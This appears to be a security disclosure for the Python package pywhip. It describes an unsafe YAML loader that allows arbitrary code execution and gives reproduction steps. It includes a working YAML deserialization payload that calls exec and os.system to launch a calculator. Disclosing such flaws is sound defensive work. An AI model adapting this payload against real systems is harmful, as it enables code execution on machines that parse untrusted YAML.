# :dizzy: Description:
- Pywhip is a python package to validate data against whip specifications. that allows users to use it from a CLI script too. due to insecure way parsing specifications file with regular YAML loader that isn't safe by default. attacker can trigger Arbitrary code execution by including malicious YAML file

# :ok_hand: Steps To Reproduce:
- Install pywhip from source. go to `pywhip` directory
- Create a `config.yml` file with this content

```yaml
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
```
- Create a simple CSV file that does contain any content
- Run `cli.py` with these options: `python3 cli.py test.csv config.yml`
- See the code execution happening.

# :boom: Proof Of Concept:
- Here's a Screen Shot For The Code Execution On Pywhip:

![POC](https://i.imgur.com/ZEHm35c.png)
